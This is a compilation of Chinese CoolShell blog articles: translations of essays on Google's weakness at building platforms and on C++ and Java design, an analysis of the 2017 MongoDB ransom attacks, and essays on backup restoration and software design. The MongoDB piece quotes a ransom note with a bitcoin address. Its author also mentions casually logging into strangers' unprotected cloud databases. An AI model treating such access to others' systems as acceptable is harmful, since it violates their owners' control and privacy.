* 如果你有上百个Services，而且你的程序只能通过由这些Services来跟其他团队的程序做沟通，那么，没有一套Service发现机制的话，你就不能找到这些Service。所以，你得先有一套Service的注册机制，这也是一个Service。所以，Amazon有一套全体适用的Service注册机制，以例可以通过反射机制来找到Service，并知道Service的API，以及是否可用，在哪儿。* 调试其他人的代码以调查问题变得非常的难，几乎都不可能，除非有一套全面性的标准的方式，他可以在可被调试的沙盒里运行所有的Services。上面这些只是极少数几个例子，在Amazon在进化的过程中，Amazon遇到这样的问题可能一打甚至数百个，Amazon都一一学习和总结了。对于把Service外部化甚至还有很多几乎没有人会想到的非常生僻的东西，当然，也不会有你想像的那么多，Amazon都学到了。把业务组织成Service让团队学会了不能相信对方，就如同他们不能信任公司以外的程序员一样。当我在2005年中期离开Amazon加入Google时，这个努力进化的过程还在进行时中，但那时已经相当的先进了。从Bezos颁布法令的时间到我离开的时候，Amazon已经把文化转变成了“一切以Service第一”为系统架构的公司，今天，这已经成为他们进行所有设计时的基础，包括那些绝不会被外界所知的仅在内部使用的功能。
那时，如果没有被解雇的的恐惧他们一定不会去做。我是说，他们今天仍然怕被解雇，因为这基本上是那儿每天的生活，为那恐怖的海盗头子Bezos工作。不过，他们这么做的确是因为他们已经相信Service这就是正确的方向。他们对于SOA的优点和缺点没有疑问，某些缺点还很大，也不疑问。但总的来说，这是正确的，因为，SOA驱动出来的设计会产生出平台（Platform）。是的，这就是Bezos的法令要达成的目标。他以前（现在也是）一点不关心各团队是否好，也不关心他们使用什么样的技术，实际也不去管他们如何运作他们的业务，除非团队开始把事搞砸。但是，Bezos比绝大多数的亚马逊人都很早很早就领悟到，Amazon必须成为一个平台。**如果是你，你会想到要把一个在线卖书的网站设计成为一个有扩展性，可程序化的平台？你真的会这样想吗？**嗯，第一件Bezos领悟到的大事是，为了销售书籍和各种商品需要的基础架构，这个基础架构可以被转变成为绝佳计算平台（Computing Platform）。所以，现在他们有了Amazon Elastic Compute Cloud（亚马逊弹性运算云平台EC2），Amazon Elastic MapReduce，Amazon Relational Database Service（亚马逊关系数据库服务），以及其他可到AWS aws.amazon.com查得到的一堆Service。这些服务是某些相当成功的公司的后台架构，比如 我个人喜欢的 reddit 是这一堆成功公司的其中一个。
另一大领悟是，他知道他们不可能永远都创造出对的东西。我认为，当Larry Tesler说他妈妈完全搞不懂怎么使用那个该死的网站时，Bezos的某根筋被触动了，当然，我也不清楚到底是谁家母亲，这无关紧要，因为没有人的母亲能够会用那个该死的网站。事实上，连我这个在那工作超过5年的人都觉得Amazon网站的接口令人胆战惊心。我并不是很确定Bezos是如何领悟到的——领悟到他不能创造 出一个产品能适用于所有的人。不过，怎么来的这不重要，重要的是他的确领悟了。这种事有一个正式的术语，叫Accessibility，这是计算机世界中最最重要的事情了。最！重！要！的！事！如果你在心里面在想“哼？你是说，像盲人和聋人那种Accessibility吗？”，那么，你不是唯一这样想的人，因为我已经知道有 **很多很多** 像你这样的人：这种东西对你们这种人来说是不可能有正确的Accessibility，所以这事你还不能理解。当然，不能理解也不是你的错，就像眼盲，耳聋，或是其他行动不便的残疾人，这些也不是他们的错。当Software——或ideal- ware——如果因为某些原因不能被存取或使用，那么，这就是软件或是那想法的错了。这就是Accessibility failure。
就如同生命中那些重大的事一样， 每个事都有一个邪恶的双胞胎姊妹，它在幼年都受到父母的溺爱，现在它已经成长为同等强大的复仇女神（是的，Accessibility有不只一个复仇女神），这个复仇女神叫安全性（Security），他们在一起总是争执不休，冤家一对。不过，我会和你争论Accessibility要比安全性来的重要多了，因为零Accessibility就意为着你根本没有做出产品来，而如果安全性为零，你仍然还是可以有一个某个程度上成功的产品，譬如说Playstation Network。对了，也许你还没注意到，我其实可以为这篇文章写出一整本书，很厚的一本，其中填满了那家我曾工作过的公司里关于蚂蚁与橡皮槌的事。但是，我可能也就永远无法在这发表这短篇的夸夸其谈了，而你也就无法读到除非我现在开始结尾。#### 第三部分那三件Amazon比Google强的中的最后一件事是，Google很不会做平台（Platform）。我们就不懂什么是平台。我们就根本不知道平台的内涵。你们其中一些人明白，但是你们是少数派。在Google过去这六年来，越清楚这一点就越让我痛苦。我曾有一线希望，来自Microsoft和Amazon，以及近来Facebook的竞争压力，会让我们全体人都清醒过来，并开始打造我们公司的Service。不是那种特制的或半生不熟的，而是多少和Amazon的类似的那种：一次到位，真正的，没有作弊或是欺骗，并且把它放在最高优先级的位置。
但实际上却不是，这个事被放在了好像是第10还是第11位，或是第15位，我不知道，反正是相当低。只有少数几个团队严肃地看待这个事，但大多数的团队不是 **从没有** 思考过这个事，就是只有一很少的人很鼠目寸光地在看待这个事。对大多数的团队来说，只要是让他们以提供给别人那种可程序化的方式存取他们的数据与运算的方式来开发软件，就算几个小小的粗糙的Service，对他们来说也是翻天覆地。他们大部分人都认为他们在做产品，但他们只是在提供那些凄惨粗糙的Service。回去看看前面我所列的那些部分的Amazon学到的东西，然后告诉我，哪一个粗糙的Service能让你有超凡脱俗的产品。迄今为止，就我所知，一个也没有。就算是这些粗糙的东西很不错，不过这就好像要汽车的时候，你却只有汽车的零件。**没有平台的产品是没用的，再精确一点，去平台化的产品总是被平台化的产品所取代** 。Google+是我们完全失败的不懂Platform最明显的例子，从最高层的管理层（嗨，Larry、Sergey、Eric、Vic，你们好）一直到最最底层的员工（嘿，你）都不懂。我们全部统统都不懂。平台Platform的黄金守则是Eat Your Own Dogfood（吃你自己的狗食——自己都要用自己的平台）。Google+这个平台是个杯具的事后抄袭者。我们在发布它的时候完全没有任何API。我查了一下，目前也只有少得可怜的API。Google+的一个团队的成员在发布API时告诉我这个事，我问：“这是Stalker API（用来偷窥内部数据的API）吗？”，她郁闷地说，“是啊”。我的意思是，我那只是个玩笑话，但是，不，我们提供的唯一的API就是取得某人的信息流，所以，我想我把玩笑开到自己头上了。
Microsoft知道“狗食守则”至少有20年了。这已经成为他们世世代代文化的一部分了。不能是你吃人类的食物而给你的开发人员们喂狗食。那样做只会是为了短期的成功而掠夺了平台长期价值。平台就是要你考虑得长远。Google+就像膝跳反射，一种短视的的东西，是基于以为Facebook其伟大产品的成功作出的错误判断。但那不是为什么他们能成功的东西。Facebook的成功是因为他们建立了一个可以让外界在其上上面开发的产品群。所以对Facebook对每个人来都不一样。有些人把全部时间花在“Mafia Wars”上，有些人则是花在“Farmville”（开心农场）。那里还有成百上千个不同的高质量的时间消耗类的游戏，所以，人们总是可以在那里找到他们想要的。我们的Google+团队看了看说：“哎呀，看来我们需要一些游戏，让我们去找一些人来为我们写些游戏吧”。你是否开始看到这样的的思考有多么不靠谱了吗？问题在于我们试图在预测人们想要什么，然后推出产品给他们。你不能这么做。真的不能。也不可靠。在这个世上，甚至在整个计算机的历史上，只有极少数几个人能够这么干，Steve Jobs是其中一个。但是我们没有Steve Jobs。对不起，我们真的没有。
Larry Tesler有可能说服了Bezos相信他并不是Steve Jobs，但Bezos意识到他不需要成为Steve Jobs也能提供给所有人好的产品：大家感到容易使用的接口与工作流。Bezos明白他只要有让第三方开发人员来做的平台，这些东西自然就会有的。我要向一些人道歉，这些人会觉得我所说的是再明显不过的了。是的，的确是巨明显的。只是我们没有去做。我们没有领会平台，我们也无法领会到Accessibility。这两者本来就是同一件事，因为平台会解决Accessibility。而平台就是Accessibility。* 是的，Microsoft领会到了。而且你们也像我一样知道Microsoft他们对这些东西一知半解。那是因为他们能够了解平台完全是他们商业上意外性的副产品，是他们一开始的业务就是提供平台。所以他们在这个领域有着三十多年的经验。如果你去看看 msdn.com，并多花点时间浏览一下，假设你以前从没去看过，你等着被吓到吧，因为那里面的东西可是多得不能再多。他们拥有 **成千成千成千** 个API。他们拥有一个 **超巨大** 的平台。说实话，太巨大了，因为他们要霸占一切，但至少他们做了。
* Amazon也领会了到了。Amazon的AWS(aws.amazon.com)相当的惊人。去看看吧，四处点一下。令人羞耻吧。我们今天什么都还没有。* 很明显Apple也领会到了。他们做了在基础上不开放的选择，具体来说是移动平台。但是他们明白什么是Accessibility，并且他们知道如何燃起第三方开发团体的力量，而且他们吃自己的狗食。你知道吗？他们的狗食做得很好吃啊。他们的APIs比Microsoft的要干净不知道多少倍，而且是远古的时候就这样了。* Facebook也领会到了。这正是让我所担心的。这使得我不得我抬起懒惰屁股写下这些东西。我恨写Blog。我恨……Plus（指Google Plus）不管怎么称呼它，反正在Google+上发表长篇大论，就算这是个糟糕的地方，但是你还是希望Google能成功.我真希望！我的意思是，Facebook想挖我，而且很容易就去了。但Google是我的家，所以我坚持我这个小小的家庭干涉，就算你不舒服。等到你为Microsoft与Amazon提供的平台感到神奇后，当然，我想也你可能会被Facebook吓到（我不敢去看，因为我不想让我太沮丧），让我们回头看看 developers.google.com 。是不是有很大的差别？我们的这个平台看起来像是你家小学五年级的侄子搞出来的东西一样——让一个小学五年级的学生，试着为一个强大的的平台公司去设计平台，就像像我们问这个小学生：“如果这家公司什么资源都有，那你会做出个什么东西来？” 一样。
这里请不要误解我——我知道一个事实，dev-rel 团队为了发布这些API曾经不得不去“搏斗”。据我所知，这个团队很不错，因为他们知道什么是平台，并且他们如英雄般努力挣扎地要做出来，然而遇到的却是“平台冷漠”的环境，难听点还是那种有敌意的环境。我只是在直白地描述出一下 developers.google.com 在外人眼里是什么样子。它看起来很幼稚。Maps APIs在哪呢，老天啊？其中有些东西还是实验性的项目，我点进去看的APIs……他们都毫无价值。他们很明显都是些真正的狗食。甚至都称不上是好的有机食品。跟我们内部APIs比起来，他们全部简直就是猪屎马粪。当然，也不要错误地理解我对Google+的看法。他们还不算是最差的。这是文化氛围的事。我们现在做的简单来说就是要进行一场战争，是一场失败很多的少数的平台派和那些强大的信心坚持的产品派的战争。那些从头到尾明白理解供外部可程序化的平台概念的团队都是受压迫的人——Maps跟Docs团队浮现在我脑海中，而且我也知道GMail是这个方向的先头部队，但是他们很难得到资金注入，因为这不是我们文化的一部分。Maestro的资金完全没法和Microsoft Office开发平台的资金相比：就像小白兔和暴龙相比一样。Docs团队知道自己永远无法和Office竞争，除非他们能赶上Office的脚本能力，而且他们得不到他们相要的资源。我的意思是我假定他们没有，现在应用的脚本能力只在电子表格中有，而且没有为API设置键盘快捷键。在我看来，这个团队完全没有被重视。
具有讽刺意的是，Wave是个伟大的平台，愿他能安静地长眠。我们需要知道，做一个平台并不会马上给带来成功。平台需要杀手级应用。Facebook——他们供应了的涂鸦墙和朋友关系网等其他东西——则是Facebook平台的杀手级应用。但是，如果你说没有Facebook平台，仅有Facebook应用也能像今天这样成功，那么，这会是一个非常严重的错误。你知道吗？人们总是在说Google的傲慢自大。我是个Google人，所以我和你一样当听到那些话都会觉得很愤怒。但总体而言，我们并不傲慢。我们大约99%不自大。我在文章开头时就写到——如果你回去看看—— 我是这样描述Google的“所有的事都做对了”。我们知道人们为什么要这么说我们自大，因为我们没有雇用他们，或是因为他们对我们的政策不爽，或是那一类的事情。他们推断出我们自大是因为这样会让他们心理平衡一些。（陈皓注：作者在这里的反话正说）但是，当我们摆出那种我们知道怎么给用户设计出完美的产品的姿态时，你最好相信我，我们就是笨蛋。你可以说是自大，天真，或是别的什么，无所谓，但最终的结果就是我们干的很愚蠢。因为，这世界不可能有一个产品对所有人都是完美的。你看，我们的浏览器居然不能让人设定默认的字号。这就是我们对Accessibility的公然冒犯。我的意思是，我总有一天会老的，我也会得老花眼，并会变瞎的。我的意思是我不会变瞎，但是如果你到了40岁，你的老花眼让你看不清近的东西。那么，字号的选择会成为生和死的问题：某用户就会被完全排除在产品之外。但是Chrome团队就是这么NB傲慢：他们想要开发出无需配置的产品，他们对此相当自豪，去你TMD是瞎子还聋子，管你是谁，在你剩下的日子每访问一个页面都按一下Ctrl-+吧。
并不仅是他们是第一个。问题是，我们是一家“产品”公司，一直一直都是。我们开发的最成功最有吸引力的产品——搜索引擎，那样巨大的成功让我们产生了很多定式和偏见。* Amazon过去也是家产品公司，一道神秘的力量使得Bezos领悟到他们需要平台。那道神秘力量来源于，他们被 逐渐蒸发的市值逼到墙角了，不得不想方设法突围出来。但他当时所拥有的只有一群工程师和他们的一堆计算机……除非他们能变成印钞机……你可以看到他们是怎么搞出来AWS的，而不是像我们Google+一样事后诸葛亮。* Microsoft从一开始就是个平台，所以他们有很多很多的实践。* Facebook：我有些没看透。我不是专家，不过我很肯定他们一开始也是一个产品，并且成功了很长时间。所以我不知道他们什么时候开始转变成为平台的。应该是很久以前的事了，因为他们要成为平台后，Mafia Wars这玩意才会出现（而Mafia Wars也很老了）。也许，Facebook只是看一眼我们，就问到：“我们如何击败Google？他们少了什么？”我们面对的问题非常的庞大，因为我们需要经过剧烈的文化转变后，我们才能迎头赶上。我们没有内部的SOA平台，所以我们外部也没有。这就是说，我们整个公司都“没有领会到”：产品经理没有，工程师没有，产品团队没有，没人领会到。就算是个别人有，比如你你有，那也相当于没有，除非我们在生死存亡的时候。我们不能这样不断推出产品，并装作我们以后会把这些产品转变成迷人美丽的可扩展式的平台。我们试过了，不行。
平台的黄金守则，“Eat Your Own Dogfood 吃自己的狗食”，换句话说，“先打造出自己使用平台，然后把它用在所有的地方”。你不能事后再做，那样做就太困难了——你去问问那些把MS Office平台化、把Amazon平台化的人。如果你放在后面做，那么你比一开始要花十倍的精力才能做对。你不能作弊，你不能让内部软件走秘密通道以取得特定的优先权限，不为什么，你必需从一开始就要解决这个问题。我不是说现在做已经太迟了，但我们等的越长，我们就会越接近——“太迟了”。老实说，我不知道这篇文章怎么收尾。我今天在这里说得太多了。因为这篇文章花了我6年时间。请包涵我言语冒犯之处，包涵我可能误解了一些产品，团队，或某个人。也许我们真的在开始做了很多平台方面的东西，只是我没看到。我只想说声对不起。但是，我们现在开始必需把事做对了！（全文完）# C++和JAVA传统中积极的一面作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn**!bruceeckel译者注** ：本文翻译自Bruce Eckel（《Thinking in C++》& 《Thinking in Java》作者）的博文，该博文于2009年03月14日发表于：
本文的发表引起了互联网上热烈的讨论，关于讨论大家可以到这里围观。下面是原文。原名《 **The Positive Legacy of C++ and Java** 》**摘要：**在最近的讨论中，有些人断定C++并不是一个设计完美的语言。在我在C++标准委员那8年里，我目睹所有关于C++的决议的诞生。我希望本文有助于帮读者理解C++和JAVA的设计选择，从而可以让大家更全面的来看待他们。有人说，我很少再使用C++。当我使用C++时，我只是为了测试一下陈旧的代码，或者写一个和性能密切相关的程序，通常这个程序非常小，并且通过其他的语言来调用。(我喜欢的做法是，用Python快速开发一个程序，用profile辅助程序对其进行性能优化，如果需要的话，通过Python的ctypes调用C++写的程序来改善性能)。因为我曾经是C++标准委员会的一员，我目睹了这些决议的产生。这些C++决议都是在经过超级深思熟虑的考虑之后在做出，他们远比大多数Java的决议更为谨慎小心。然而，就像有些人准确地指出那样，C++是复杂而难于使用的，并且充满了各种个样容易让人忘记的古怪的规则。当我在写书的时候，我只能从规范中找到这些规则的说明，而不是自己能记住这些规则。
为了让人们理解C++这门语言如何即难用、复杂，同时还要有良好的设计，你必须记住一条C++中最主要的设计原则——兼容C语言。这是Stroupstru最正确的决定，这样做将会出现一条让大量的C程序员通向C++程序的捷径：这条捷径允许C程序员不需要做任何修改就可以在C++下编译程序。然而，这也成为了C++语言巨大的约束，它给C++带来了强大的力量，同时也给C++带来了无尽的痛楚。正是因为这个约束导致了C++如此的成功，并且也如此的复杂。这些C++古怪的条约使那些没有完全了解C++的Java的设计者们犯了傻。例如，他们认为程序员能用好操作符重载将会是非常困难的一件事。但是操作符重载在C++中却是必须的，因为在C++中有栈分配，同时又有堆上的分配，你只有通过重载好操作符来处理好不同类型的内存分配，并保证不会产生内存泄漏，的确是难！但对Java来说，因为Java只有单一的一种内存分配机制（ **译者注：** Java基本上是采用堆分配）和垃圾回收机制，这样操作符重载在Java中就变得多余（正如C#的操作符重载，和更早之前的Python操作重载，但是Python出现的要比Java早）。但是多年以来，来自Java的团队就一致认为“操作符重载太过复杂”。这一决议或其他的一些Java决议，明显说明了很多Java的设计者在做出决议的时候没有做足自己的工作，这也是为什么我有了一个藐视由Gosling和他的Java团队所做决议的名声。
同样还有太多太多的例子，基本类型“因为性能原因被引入”。真正的原因是为了坚持“所有都是对象”，并且同时为底层具有效率要求的程序提供一个后门（同时这也使得一些热点技术执行起来更有效率）。噢，但是事实是，你没有办法直接使用浮点处理器来进行超越函数的计算（ **译者注：** Transcendental Functions ，一种微积分的函数），而只能使用软件来计算，但原本这类函数就可以使用浮点计算处理器来计算的。我尽我所能将类似这样的问题罗列出来，但是我听到的结果却总是那些无用的回答“这就是Java的方式”。当我写下泛型是个如何糟糕的设计时，我得到了同样的回应，“我们必须兼容之前的（糟糕的）Java的决议”。最后越来越多的人们获得了足够关于泛型是多难用的经验——的确，C++的泛型更强大，一致性更好（尤其现在当编译器的错误信息越来越清晰后，泛型也比以前更好使用），因为Java泛型设计很差，很难，所以人们又开始回到认真对待具现化而不是泛型，当然，这对语言是有帮助的，因为具现化这个东西并不会消弱太多的语言设计，也不会因为这些自我限制而导致语言缺陷。那个Java的问题列表在这些沉闷的回应面前只能显得单调乏味。那么，是不是这样就意味着Java是失败的语言设计呢？绝对不是，Java将主流程序员带入到了一个垃圾收集器、虚拟机、一致的错误处理模型的世界(如果你不使用异常处理，这类异常可能是非常有用的异常，正如我在《Think in Java 》4ed中演示的那样)。伴随着它设计上种种缺陷，Java把我们带领到了一个更高的层次，在这个层次上我们正在准备着迎接更为高级别的语言。
另一个观点，人们一直认为C++是语言中的先驱，许多人也认为Java是语言的先驱。但是因为虚拟机，Java使得自己更容易被别的语言替代。现在任何人都有可能快速创建一门新的语言，并且和Java具有一样的效率；而以前，要得到一个正确的，有效率的编译器花去了开发一门新语言的大部分时间。现在，我们正在见证这一切的发生——不管是更高级的静态语言，例如Scala，或者说是动态语言（ **译者注** ：Dynamic Language，如Python或Ruby），不管是新的还是移植的，例如Groovy ，JRuby和Jython。这就是未来的趋势，并且其过度将会非常的平滑，因为你可以在已有的Java代码中使用这些新语言，如果有需要，你甚至可以重写Java中产生有性能瓶颈的地方。正如C++会消亡一样，Java自生有可能消亡，或着被用于特殊环境之下（或仅仅是为了支持以前遗留的代码，因为Java并不像C++那样会被用于硬件编程）。但是Java 真正的亮点，也是意料之外的收获，就是如果当Java已经到了自身没法在进化的地步时，Java已经为其替代者创建一条平滑之路。所有未来的语言都将从这里学到：要么为自己创建一种可以不断重构(进化)(正如Python和Ruby做的那样)的文化，要么就让其竞争者发展壮大。
# 从 MongoDB “赎金事件” 看安全问题作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn今天上午（2017年1月7日），我的微信群中同时出现了两个MongoDB被黑掉要赎金的情况，于是在调查过程中，发现了这个事件。这个事件应该是2017年开年的第一次比较大的安全事件吧，发现国内居然没有什么报道，国内安全圈也没有什么动静（当然，他们也许知道，只是不想说吧），Anyway，让我这个非安全领域的人来帮补补位。#### 事件回顾这个事情应该是从2017年1月3日进入公众视野的，是由安全圈的大拿 Victor Gevers （网名：0xDUDE，GDI.foundation 的Chairman），其实，他早在2016年12月27日就发现了一些在互联网上用户的MongoDB没有任何的保护措施，被攻击者把数据库删除了，并留下了一个叫 WARNING 的数据库，这张表的内容如下：{     "_id" : ObjectId("5859a0370b8e49f123fcc7da"),     "mail" : "[[email protected]](/cdn-cgi/l/email-protection)",     "note" : "SEND 0.2 BTC TO THIS ADDRESS 13zaxGVjj9MNc2jyvDRhLyYpkCh323MsMq AND CONTACT THIS EMAIL WITH YOUR IP OF YOUR SERVER TO RECOVER YOUR DATABASE !"     }
基本上如下所示：!MongoDB ransom demand \(via Victor Gevers\)MongoDB ransom demand (via Victor Gevers)说白了就是黑客留下的东西—— **老子把你的MongoDB里的数据库给转走了，如果你要你的数据的话，给我0.2个的比特币（大约USD200）** 。然后，他的twitter上不断地发布这个“赎金事件”的跟踪报道。与此同时，中国区的V2EX上也发现了相关的攻击问题 《自己装的 mongo 没有设置密码结果被黑了》然后，在接下来的几天内，全球大约有1800个MongoDB的数据库被黑，这个行为来自一个叫 Harak1r1 的黑客组织（这个组织似乎就好黑MongoDB，据说他们历史上干了近8500个MongoDB的数据库，几乎都是在祼奔的MongoDB）。不过，这个组织干了两天后就停手了，可能是因为这事已经引起了全球科技媒体的注意，产生了大量的报道（如果你在Google News里查一下“mongodb ransom”，你会看到大量的报道（中文社区中，只有台湾有相关的报道）），他们也许是不敢再搞下去了。不过，很快，有几个copycats开始接着干，
马上跟进的是 own3d ，他们留下的数据库的名字叫 WARNING_ALERT，他们至少干掉了 930个MongoDB，赎金0.5个比特币（USD500），至少有3个用户付费了然后是0704341626asdf，他们留下的数据库名字叫PWNED，他们至少干掉了740个MongoDB，赎金0.15个比特币（USD150），看看他们在数据库里留下的文字—— **你的MongoDB没有任何的认证，并且暴露在公网里（你TMD是怎么想的？）……**!0704341626asdf group ransom note \(via Victor Gerves\)0704341626asdf group ransom note (via Victor Gerves)就在这两天，有两个新的黑客也来了* 先是kraken0，发现到现在1天了，干了13个MongoDB，赎金 0.1个比特币。   * 然后是 3lix1r，发现到现在5个小时，干了17个MongoDB，赎金0.25比特币。BBC新闻也于昨天报道了这一情况——《Web databases hit in ransom attacks》，现在这个事情应该是一个Big News了。
#### 关于MongoDB的安全安全问题从来都是需要多方面一起努力，但是安全问题最大的短板就是在用户这边。这次的这个事，说白了，就是用户没有给MongoDB设置上用户名和口令，然后还把服务公开到了公网上。是的，这个安全事件，相当的匪夷所思，为什么这些用户要在公网上祼奔自己的数据库？他们的脑子是怎么想的？让我们去看一下Shodan上可以看到的有多少个在暴露在公网上而且没有防范的MongoDB？我了个去！ **4万7千个，还是很触目惊心的** （下图来自我刚刚创建的 Shodan关于MongoDB的报表）那么，怎么会有这么多的对外暴露的MongoDB？看了一下Shodan的报告，发现主要还是来自公有云平台，Amazon，Alibaba，Digital Ocean，OVH，Azure 的云平台上有很多这样的服务。不过，像AWS这样的云平台，有很完善的默认安全组设置和VPC是可以不把这样的后端服务暴露到公有云上的，为什么还会有那么多？这么大量的暴露在公网上的服务是怎么回事？有人发现（参看这篇文章《It’s the Data, Stupid!》 ），MongoDB历史上一直都是把侦听端口绑在所有的IP上的，这个问题在5年前（2011年11月）就报给了MongoDB (SERVER-4216)，结果2014年4月才解决掉。所以，他觉得可能似乎 MongoDB的 2.6之前的版本都会默认上侦听在0.0.0.0 。
于是我做了一个小试验，到我的Ubuntu 14.04上去 `apt-get install mongodb`（2.4.9版），然后我在`/etc/mongodb.conf` 文件中，看到了默认的配置是127.0.0.1，mongod启动也侦听在了127.0.0.1这台机器上。一切正常。不过，可能是时过境迁，debain的安装包里已加上了这个默认配置文件。不管怎么样，MongoDB似乎是有一些问题的。再到Shodan上看到相关的在公网裸奔的MongoDB的版本如下，发现3.x的也是主流：虽然，3.x的版本成为了主流，但是似乎，还是有很多人把MongoDB的服务开到了互联网上来，而且可以随意访问。**你看，我在阿里云随便找了几台机器，一登就登上去了。**真是如那些黑客中的邮件所说的：WTF，你们是怎么想的？#### 后续的反思为什么还是有这么多的MongoDB在公网上祼奔呢？难道有这么多的用户都是小白？这个原因，是什么呢？我觉得可能会是如下两个原因：1）一是技术人员下载了mongod的软包，一般来说，mongodb的压缩包只有binary文件 ，没有配置文件 ，所以直接解开后运行，结果就没有安全认证，也绑在了公网上。也许，MongoDB这么做的原因就是为了可以快速上手，不要在环境上花太多的时间，这个有助于软件方面的推广。但是，这样可能就坑了更多的人。
2）因为MongoDB是后端基础服务，所以，需要很多内部机器防问，按道理呢，应该绑定在内网IP上，但是呢，可能是技术人员不小心，绑在了0.0.0.0的IP上。那么，这个问题在云平台上是否可以更好的解决呢？**关于公网的IP。** 一般来说，公有云平台上的虚拟主机都会有一个公网的IP地址，老实说，这并不是一个好的方法，因为有很多主机是不需要暴露到公网上的，所以，也就不需要使用公网IP，于是，就会出现弹性IP或虚拟路由器以及VPC这样的虚拟网络服务，这样用户在公有云就可以很容易的组网，也就没有必要每台机器都需要一个公网IP，使用云平台，最好还是使用组网方案比较好的平台。**关于安全组** 。在AWS上，你开一台EC2，会有一个非常严格的安全组——只暴露22端口，其它的全部对外网关闭。这样做，其实是可以帮用户防止一下不小心把不必要的服务Open到公网上。按道理来说，AWS上应该是帮用户防了这些的。但是，AWS上的MongoDB祼奔的机器数量是最多的，估计和AWS的EC2的 基数有关系吧（据说AWS有千万台左右的EC2了）最后，提醒大家一下，被黑了也不要去付赎金，因为目前来说没有任何证据证明黑客们真正保存了你的数据，因为，被黑的服务器太多了，估计有几百T的数据，估计是不会为你保存的。下面也是Victor Gevers的提示：
（全文完）# 别只谈系统备份，谈谈怎样恢复系统吧！作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn_文章来源 JoelOnSoftware.com__很久以前就看到这篇文章，它给了我很深刻的印象，搜索了一下 JoelOnSoftware 的中文 Wiki，似乎也没有此文的中文版，那就让酷壳来完成吧。_* 你备份你的系统了吗？   * 你备份服务器了吗？   * 你的备份是否存放在另一台机器中？   * 你是否有异地备份？以上都是非常好的问题，也都是很好的备份习惯。不过，让我们别再只谈备份了，因为仅仅备份是远远不够的。资深的系统管理员们都会告诉你他们有完美的备份计划，但是问题往往发生在当你需要恢复系统的时候：* 备份文件被密钥加密，而遗失或损坏的恰恰就是存放密钥的那台机器。   * 存放着大量配置信息的 IIS 元数据库恰好没有备份。   * 备份文件一直被拷贝到一个限量2GB的FAT分区，多出来的数据被默默地抛弃掉了。   * 你的备份都在一个LTO磁带上，磁带已经和数据中心一起遗失或损坏了（911？）。   * 即便你有了备份，仍有可能遇到许许多多的意外情况。
所以，保证基本的系统安全不仅仅取决于你做了备份，还在于你是否能够成功恢复备份。如果你在运营一个 WEB 服务，你需要向我展示你能够在合理的时间内，在一台新的服务器或者是和原来的数据没有任何关系的服务器上，使用近期备份的数据还原出整个网站。让我们不要再问人们是否做了系统备份，而是问他们是否能够恢复系统。# 多些时间能少写些代码作者：陈皓，左耳朵耗子来自：酷壳网 CoolShell https://coolshell.cn我在我的微博上说过这样一段话，我想在这里把我的这个观点阐述地更完整一些。> @左耳朵耗子：聪明的程序员使用50%-70%的时间用来思考，尝试和权衡各种设计和实现，而用30% – > 50%的时间是在忙碌着编码，调试和测试。聪明的老板也会让团队这样做。而傻逼的老板，苦逼的程序员会拿出来100%-150%的时间来忙着赶进度，返工，重构，fix > 大量的bug… 所以， 越差的团队一般会越忙，而且还忙不完。在现在这个浮躁的时期，再加上敏捷咨询师们念的歪经，他们让人感觉上就像是软件产品是可以在很短的时间内高质量的完成的，这令那些管理者们很兴奋，就像巴甫洛夫的条件反射实验中的狗看到了肉就会流口水那样兴奋。他们使用TDD，快速迭代，不断重构，持续集成直至持续部署的方法在进行软件开发。
软件开发真是这样的吗？难道不需要花时间去思考吗？对此，有些观点在Todd的《“品质在于构建过程”吗？》以及《Bob大叔和Jim Coplien对TDD的论战》中谈到过了。我只想想表达下面的观点：* **软件的精髓在于设计，设计是一件很费大脑的事件** 。对于软件来说，设计没有完美的，它总是一件需要取舍需要权衡的事，比如：时间换空间，空间换时间，TCP或UDP，同步还是异步，数据冗余还不冗余等等。那怕是一个小小的observers模式是pull方式还是push方式 都需要仔细讨论。这些的东西需要时间和做前期尝试。* **TDD** 、 **快速原型和迭代可能会对软件和团队产生负面影响** 。在一开始，你需要花很大的精力来让你的软件从无到有（做过软件的人都知道，从零开始写代码是很痛苦的事），但是因为你没有想好，先做再说，所以，后期你会面临更多的质量问题而让你需要花更多的时间精力。当然，那些咨询师会让你用持续集成和持续部署这样的方法。但我想告诉你，这并不解决你软件设计的缺陷。举个例子——TDD、迭代、原型只关注功能性需求，其不会关注非功能性需求，比如性能问题，高可用性问题，系统维护问题（模块的耦合问题），等等。而这些问题往往都可以让你的软件设计重新来过。
* **重构是恶梦，重构应该越少越好** 。当你维护一个复杂的系统时你会知道重构是一件多么恐怖的事情（参看《重构代码的7个阶段》）。如果一开始没有想好，你要面临的不单单是re-design, re-architect，还要面对时间和人力成本的增加，最难的是你还要面对的是团队士气因为不断的rework而逐渐低落并产生厌倦和懈怠情绪。所以，如果你能有多一些时间去和客户讨论一下需求和未来可能的变化，去调查一下实现的技术难点和细节，去和其他有经验的人讨论并推敲一下架构和设计，去思考设计上的缺陷，那么，你的coding会变得非常地直，直到你一眼就看到尽头，你的测试案例也会写得非常地好，你会几乎不需要重构，于是，你会在未来少写很多代码，从而你的软件开发会越来越轻松，直到技术开始换代。我现在在做的项目，花了几乎4个月的时间来做设计，在这个过程中，我们反复思考、讨论和权衡若干种实现方法，并尽可能地穷举所有的场景和细节以及未来可能的变化（那怕是那些简单的模块），有个模块被重写了至少三次，每次都是写到一半就被推翻重写，我们整个团队不断地在和其它团队讨论，并在对系统不断地认识中对系统进行简化和优化，并力求达到完美。现在看来，没有贸然使用Scrum是明智的。
